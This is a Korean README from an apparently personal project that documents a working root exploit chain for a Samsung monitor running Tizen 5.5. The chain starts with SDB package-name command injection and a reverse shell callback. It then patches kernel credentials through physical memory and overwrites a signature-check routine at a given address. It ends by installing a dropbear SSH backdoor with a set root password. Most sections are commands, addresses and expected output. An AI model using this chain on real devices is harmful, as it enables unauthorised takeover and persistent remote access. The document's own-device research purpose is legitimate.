# 01 · 루트와 셸

이 문서가 저장소에서 빠져 있던 부분입니다. **`sdb root on`으로 root가 되지 않습니다.** 실제 경로는 "SDB 인젝션 → sdk 셸 → 물리 메모리로 cred 패치 → root 셸 → UEP 우회 → SSH"입니다.

> 대상: `LS27AM500NKXKR` (내부코드 `20_KANTSU2_FHD_MNT`), Tizen 5.5, kernel 4.1.10 armv7l.
> 다른 펌웨어/모델에서는 주소와 동작이 달라집니다.

## 0. 전제

- 모니터에서 **개발자 모드**와 **원격 연결 허용**을 켜서 SDB(26101)가 열려 있어야 합니다.
- PC와 모니터가 같은 LAN에 있어야 합니다. 인젝션은 모니터에서 PC로 `/dev/tcp` 콜백을 겁니다.
- 아래 스크립트는 `M5_HOST`(모니터), `M5_HOST_IP`(스크립트를 돌리는 PC) 환경변수를 씁니다.

```sh
cd case-studies/root-shell
export M5_HOST=192.168.0.50
export M5_HOST_IP=192.168.0.2
```

## 1. sdk 셸 — SDB 패키지명 인젝션 (SVE-2025-50109)

`0 appinstall tpk <패키지명>`에서 패키지명이 디바이스 셸로 평가되는 문제를 씁니다. 패키지명에 `+`나 `/`가 들어가면 깨지기 때문에 `tvrun.py`가 base64 정렬을 바꿔가며 안전한 이름을 만듭니다.

```sh
python3 tvrun.py 'id; uname -a'
# uid=901(sdk) gid=...
# Linux ... 4.1.10 ... armv7l
```

이 단계는 **uid=901(sdk)** 입니다. 아직 root가 아닙니다.

## 2. root — `/dev/ntkgpu`로 `struct cred` 패치

`/dev/ntkgpu`는 `mmap` 오프셋을 물리 주소로 해석합니다. 이 성질로 커널 메모리를 직접 읽고 씁니다.

`probe.dll`은 Tizen의 서명된 `dotnet-launcher`가 로드하는 **관리(.NET) 어셈블리**입니다. UEP는 ELF만 검사하므로 이 DLL은 서명 검사 없이 실행됩니다. 실행되면 `BecomeRoot()`가:

1. `0x02000000`부터 1MB씩 물리 메모리를 매핑
2. `struct cred` 패턴 `[usage][uid][gid][euid][egid][suid][sgid][fsuid][fsgid]`을 스캔
3. 일치하는 8개 워드를 0으로 씀
4. `getuid()`가 0인지 확인하고, 아니면 즉시 원복

```sh
python3 push2.py probe.dll /opt/usr/a/probe.dll
NOCB=1 python3 tvrun.py '/usr/bin/dotnet-launcher /opt/usr/a/probe.dll run "id"'
# [+] root at phys 0x........
# uid=0(root) gid=0(root)
```

중요: 이 패치는 **그 프로세스의 cred만** 바꿉니다. 새 프로세스는 다시 `BecomeRoot()`를 호출해야 합니다. 그래서 `probe.dll`의 모든 모드가 시작할 때 이 함수를 부릅니다.

## 3. root 셸 — TCP 콜백

`probe.dll shell <host> <port>`는 모니터에서 PC로 접속해 명령을 받고 `popen`으로 실행합니다.

```sh
python3 root_shell.py 'id; cat /proc/version'
# READY uid=0 euid=0
# uid=0(root) gid=0(root)
```

`root_shell.py`가 SDB로 실행을 걸고, 콜백을 받아 명령을 보냅니다. 이 셸은 **앱/존 PID 네임스페이스** 안에 있습니다.

- `CAP_KILL` 없음 → 벤더 컴포지터를 죽일 수 없음
- `CAP_SYS_CHROOT` 없음 → chroot 불가
- `CAP_SYS_ADMIN` 있음 → `mount --bind` 가능
- 출력이 NUL로 패딩될 수 있음
- SDB 동시 연결 1개

## 4. unsigned ELF — UEP 우회

root가 되어도 서명 안 된 ELF는 `execve`가 막힙니다. 삼성 SFD/UEP가 `SfdUepVerifyFileSignature`의 판정을 검사하기 때문입니다. 이 함수의 반환값을 물리 메모리에서 `mov r0, #0`으로 바꿉니다.

```
phys 0x021D3B84 ← 0xE3A00000   (mov r0, #0 = SF_STATUS_OK)
```

```sh
NOCB=1 python3 tvrun.py '/usr/bin/dotnet-launcher /opt/usr/a/probe.dll uepapply'
sleep 45
NOCB=1 python3 tvrun.py 'cp /tmp/managed_log.txt /tmp/l'
python3 tvrun.py 'grep -a apply /tmp/l'
# [apply] phys 0x021D3B84: ... active=True
# [apply] unsigned ELF test: NATIVE ELF RAN uid=0 ...
```

주의:

- 패치는 **RAM 상주** → 재부팅하면 사라집니다.
- ARM I-cache 때문에 패치 직후 첫 실행이 옛 코드를 볼 수 있습니다. `uepapply`는 핫 루프로 캐시를 evict하고, 검증용 파일을 **새 inode**로 복사해 SFD의 inode별 캐시도 피합니다.
- 실행 파일에 `chmod 755`가 필요합니다. 실행 비트가 없으면 UEP 이전에 `EACCES`입니다.

## 5. SSH — dropbear

매번 SDB 인젝션을 쓰지 않도록 정적 ARM dropbear를 2222 포트에 띄웁니다.

```sh
ssh-keygen -t ecdsa -b 256 -N '' -f keys/m5_ecdsa
python3 push2.py keys/m5_ecdsa.pub /opt/usr/home/owner/share/m5_ecdsa.pub
NOCB=1 python3 tvrun.py '/usr/bin/dotnet-launcher /opt/usr/a/probe.dll sshd'
sleep 80
ssh -i keys/m5_ecdsa -p 2222 root@$M5_HOST
```

`probe.dll sshd` 모드가 처리하는 함정:

| 문제 | 해결 |
|---|---|
| Tizen root 계정이 `/etc/shadow`에서 잠김 → dropbear가 전부 거부 | 쓰기 가능한 shadow 사본을 만들어 `/etc/shadow`에 bind-mount |
| `/root`가 읽기전용 vdfs | `/opt/usr/a/rd`를 `/root`에 bind-mount |
| OpenSSH 8.8+가 RSA/SHA-1 서명을 거부 | **ECDSA(nistp256)** 키 사용 |
| dropbear가 SDB fd를 상속해 SDB가 끊김 | 자식에서 fd 3~9를 닫고 `setsid`로 분리 |

스크립트는 편의를 위해 root 비밀번호를 `m5`로 설정합니다. **키만 쓰고 비밀번호 로그인은 끄거나, 자신의 해시로 바꾸세요.**

## 6. 재부팅 후

다음은 모두 사라집니다.

- cred 패치 (프로세스 종료와 함께)
- UEP 패치 (RAM)
- dropbear와 bind-mount

전원 재시작 후에는 SDB가 살아 있는 상태에서 `m5.sh`를 다시 실행합니다.

```sh
./m5.sh
```

`reboot(2)`는 SMACK가 막기 때문에 재부팅은 **물리 전원**으로 해야 합니다.

## 경고

이건 커널 메모리를 실행 중에 고치는 체인입니다. 주소가 하나만 틀려도 패닉/브릭입니다. eMMC 백업([00](00-준비.md)) 없이 시작하지 마세요. 이 문서는 개인 소유 기기의 기록이며, 공개 배포용이 아닙니다.
